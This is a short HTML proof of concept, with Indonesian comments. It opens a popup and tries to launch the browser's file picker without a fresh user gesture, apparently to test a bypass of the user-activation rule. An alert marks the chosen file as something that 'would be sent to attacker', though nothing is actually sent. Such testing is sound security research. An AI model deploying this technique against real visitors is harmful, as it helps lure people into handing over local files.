<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Trigger File Picker in Popup</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: background 0.2s;
        }
        button:hover {
            background-color: #0d5bbf;
        }
    </style>
</head>
<body>
    <button id="openPopupBtn">Open Popup (Auto trigger file picker)</button>

    <script>
        document.getElementById('openPopupBtn').addEventListener('click', function() {
            // Buka popup dan tulis konten yang langsung menjalankan file picker
            const popup = window.open('', '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
            if (!popup) {
                alert("Popup blocked! Please allow popups.");
                return;
            }
            popup.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Auto File Picker</title>
                    <style>
                        body { text-align: center; margin-top: 50px; font-family: Arial; }
                        #status { margin-top: 20px; color: blue; }
                    </style>
                </head>
                <body>
                    <h3>Automatically triggering file picker...</h3>
                    <div id="status">Initializing...</div>
                    <script>
                        // Fungsi untuk memicu file picker
                        async function triggerFilePicker() {
                            try {
                                const filePromise = window.showOpenFilePicker();
                                document.getElementById('status').innerText = 'File picker opened. Select a file.';
                                const [handle] = await filePromise;
                                const file = await handle.getFile();
                                alert('File selected: ' + file.name + ' (this would be sent to attacker)');
                                document.getElementById('status').innerText += '\\nFile selected: ' + file.name;
                            } catch (err) {
                                console.error(err);
                                document.getElementById('status').innerText = 'Error: ' + err.message;
                            }
                        }
                        // Coba panggil langsung (menggunakan activation dari induk?)
                        // Beberapa browser mungkin mengizinkan jika dipanggil dalam waktu singkat.
                        setTimeout(triggerFilePicker, 10);
                    <\/script>
                </body>
                </html>
            `);
            popup.document.close();
            popup.focus();
        });
    </script>
</body>
</html>
